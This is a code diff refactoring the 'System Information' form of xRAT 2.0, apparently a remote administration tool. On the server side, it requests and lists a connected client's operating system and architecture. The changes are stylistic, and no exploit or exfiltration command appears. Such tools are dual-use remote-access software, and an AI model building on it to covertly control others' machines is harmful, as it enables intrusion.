@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Windows.Forms;
 using xServer.Core;
+using xServer.Core.Packets.ServerPackets;
 
 namespace xServer.Forms
 {
@@ -20,16 +21,22 @@ namespace xServer.Forms
         {
             if (_connectClient != null)
             {
-                this.Text = string.Format("xRAT 2.0 - System Information [{0}:{1}]", _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
-                new Core.Packets.ServerPackets.GetSystemInfo().Execute(_connectClient);
+                Text = string.Format("xRAT 2.0 - System Information [{0}:{1}]", _connectClient.EndPoint.Address,
+                    _connectClient.EndPoint.Port);
+                new GetSystemInfo().Execute(_connectClient);
 
                 if (_connectClient.Value != null)
                 {
-                    ListViewItem lvi = new ListViewItem(new string[] { "Operating System", _connectClient.Value.OperatingSystem });
+                    var lvi = new ListViewItem(new[] {"Operating System", _connectClient.Value.OperatingSystem});
                     lstSystem.Items.Add(lvi);
-                    lvi = new ListViewItem(new string[] { "Architecture", (_connectClient.Value.OperatingSystem.Contains("32 Bit")) ? "x86 (32 Bit)" : "x64 (64 Bit)" });
+                    lvi =
+                        new ListViewItem(new[]
+                        {
+                            "Architecture",
+                            (_connectClient.Value.OperatingSystem.Contains("32 Bit")) ? "x86 (32 Bit)" : "x64 (64 Bit)"
+                        });
                     lstSystem.Items.Add(lvi);
-                    lvi = new ListViewItem(new string[] { "", "Getting more information..." });
+                    lvi = new ListViewItem(new[] {"", "Getting more information..."});
                     lstSystem.Items.Add(lvi);
                 }
             }
@@ -45,7 +52,7 @@ namespace xServer.Forms
         {
             if (lstSystem.SelectedItems.Count != 0)
             {
-                string output = string.Empty;
+                var output = string.Empty;
 
                 foreach (ListViewItem lvi in lstSystem.SelectedItems)
                 {
